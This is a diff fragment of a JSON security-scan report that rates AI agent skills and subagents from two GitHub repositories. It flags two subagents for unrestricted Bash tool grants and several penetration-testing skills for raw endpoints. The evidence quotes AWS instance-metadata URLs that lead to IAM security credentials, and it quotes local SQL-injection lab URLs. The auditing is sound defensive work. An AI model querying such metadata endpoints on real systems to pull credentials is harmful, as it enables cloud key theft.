+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/mysql-database-reviewer.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/security-reviewer.md#security-reviewer",
+      "name": "security-reviewer",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/security-reviewer.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/security-reviewer.md",
+      "level": "low",
+      "score": 4,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/aws-penetration-testing/skill.md#aws-penetration-testing",
+      "name": "AWS Penetration Testing",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/aws-penetration-testing/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/aws-penetration-testing/SKILL.md",
+      "level": "low",
+      "score": 3,
+      "counts": {
+        "low": 5
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 89,
+          "evidence": "http://169.254.169.254/latest/meta-data/"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 92,
+          "evidence": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 95,
+          "evidence": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 111,
+          "evidence": "http://169.254.169.254/latest/api/token\")"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 115,
+          "evidence": "http://169.254.169.254/latest/meta-data/iam/security-credentials/\""
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/api-fuzzing-bug-bounty/skill.md#api-fuzzing-for-bug-bounty",
+      "name": "API Fuzzing for Bug Bounty",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/api-fuzzing-bug-bounty/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/api-fuzzing-bug-bounty/SKILL.md",
+      "level": "low",
+      "score": 3,
+      "counts": {
+        "low": 4
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 138,
+          "evidence": "http://127.0.0.1:8443\"/>"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 139,
+          "evidence": "http://127.0.0.1:445\"/>"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 292,
+          "evidence": "http://127.0.0.1:8443\"/>"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 295,
+          "evidence": "http://127.0.0.1:445\"/>"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/secrets-management/skill.md#secrets-management",
+      "name": "secrets-management",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/secrets-management/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/secrets-management/SKILL.md",
+      "level": "low",
+      "score": 2,
+      "counts": {
+        "low": 1
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 71,
+          "evidence": "http://127.0.0.1:8200'"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/sqlmap-database-pentesting/skill.md#sqlmap-database-penetration-testing",
+      "name": "SQLMap Database Penetration Testing",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/sqlmap-database-pentesting/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/sqlmap-database-pentesting/SKILL.md",
+      "level": "low",
+      "score": 2,
+      "counts": {
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 255,
+          "evidence": "http://192.168.1.10/sqli/Less-1/?id=1\""
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 256,
+          "evidence": "http://192.168.1.10/sqli/Less-2/?id=1\""
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/wordpress-penetration-testing/skill.md#wordpress-penetration-testing",
+      "name": "WordPress Penetration Testing",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/wordpress-penetration-testing/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/wordpress-penetration-testing/SKILL.md",
+      "level": "low",
+      "score": 2,
+      "counts": {
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 384,
+          "evidence": "http://127.0.0.1:8080"
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 387,
+          "evidence": "http://127.0.0.1:8080"
+        }
+      ]
+    }
+  ]
+}
